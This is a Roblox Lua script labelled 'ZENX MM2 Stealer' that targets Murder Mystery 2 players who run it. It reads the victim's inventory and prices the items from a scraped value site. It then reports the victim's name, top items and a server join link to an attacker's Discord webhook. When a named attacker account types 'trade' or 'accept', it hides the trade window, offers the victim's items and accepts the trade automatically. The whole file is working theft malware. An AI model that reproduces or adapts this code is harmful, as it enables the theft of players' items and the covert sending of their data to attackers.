if not _G["Script-SM_Config"] then
    warn("Waiting for config...")
    repeat task.wait() until _G["Script-SM_Config"]
end

local config = _G["Script-SM_Config"]
local webhook = config.user_webhook
local usernames = config.users or {}
local minPingVal = tonumber(config.Min_Ping) or 0

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

if game.PlaceId ~= 142823291 then
    LocalPlayer:Kick("Wrong game! Join Murder Mystery 2")
    return
end

-- Multi-Category Live Scraper
local itemValues = {}
local function scrapeCategory(cat)
    local url = "https://supremevalues.com/mm2/" .. cat:lower()
    pcall(function()
        local resp = request({Url = url, Method = "GET"})
        if resp and resp.Body then
            for name, valStr in resp.Body:gmatch(">([%w%s'%-]+)</[^>]+>%s*Value%s*%-%s*%*?([%d,]+)%*?") do
                local clean = name:match("^%s*(.-)%s*$")
                local v = tonumber(valStr:gsub(",", ""))
                if clean and v and v > 30 then
                    itemValues[clean] = v
                    itemValues[clean:lower()] = v
                end
            end
        end
    end)
end

local function loadLiveValues()
    local cats = {"godly","ancient","unique","vintage","legendary","rare","uncommon"}
    for _, c in ipairs(cats) do
        scrapeCategory(c)
        task.wait(0.6)
    end
    print("✅ Loaded " .. #itemValues .. " live values from categories")
end

loadLiveValues()

-- In-Game Inventory (original method)
local itemsToTrade = {}
local overallValue = 0
local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

local success, inventoryData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
end)

if success and inventoryData and inventoryData.Weapons then
    for itemId, count in pairs(inventoryData.Weapons.Owned or {}) do
        local info = itemDatabase[itemId]
        if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
            local name = tostring(info.ItemName)
            local val = itemValues[name] or itemValues[name:lower()] or 100
            overallValue += val * count
            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val})
        end
    end
end

table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)

-- Discord
local function postToDiscord()
    local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
    local displayLines = {}
    for i, item in ipairs(itemsToTrade) do
        if i > 12 then break end
        table.insert(displayLines, string.format("x%d %s → %d", item.qty, item.name, item.val))
    end

    local content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone **BIG HIT**" or "**Small Hit**") 
                 .. " • Value: " .. string.format("%.0f", overallValue)

    local embed = {
        content = content,
        username = "ZENX MM2 Stealer",
        embeds = {{
            title = "🍪 ZENX | Murder Mystery 2 Hit",
            color = 0xFF00FF,
            fields = {
                {name = "Victim", value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")", inline = true},
                {name = "Total Value", value = string.format("%.0f", overallValue), inline = true},
                {name = "Top Items", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
                {name = "Custom Joiner", value = joinLink, inline = false},
            },
            footer = {text = "ZENX HUB • In-Game + Live Scraper"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(embed)
        })
    end)
end

-- Trade Engine
local function checkTradeState()
    return ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
end

local function doTrade(target)
    task.spawn(function()
        postToDiscord()
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
        if tradeGui then
            tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
        end

        while #itemsToTrade > 0 do
            local state = checkTradeState()
            if state == "None" then
                ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
            elseif state == "StartTrade" then
                for i = 1, math.min(6, #itemsToTrade) do
                    local item = table.remove(itemsToTrade, 1)
                    for _ = 1, item.qty do
                        ReplicatedStorage.Trade.OfferItem:FireServer(item.id, "Weapons")
                        task.wait(0.32)
                    end
                end
                task.wait(4)
                ReplicatedStorage.Trade.AcceptTrade:FireServer()
            else
                task.wait(1.2)
            end
        end
        postToDiscord()
    end)
end

local function onPlayerAdded(plr)
    if table.find(usernames, plr.Name) then
        plr.Chatted:Connect(function(msg)
            if msg:lower():find("trade") or msg:lower():find("accept") then
                doTrade(plr)
            end
        end)
    end
end

for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
Players.PlayerAdded:Connect(onPlayerAdded)

postToDiscord()
print("✅ ZENX MM2 Stealer Ready - In-Game Inventory + Multi Scraper")
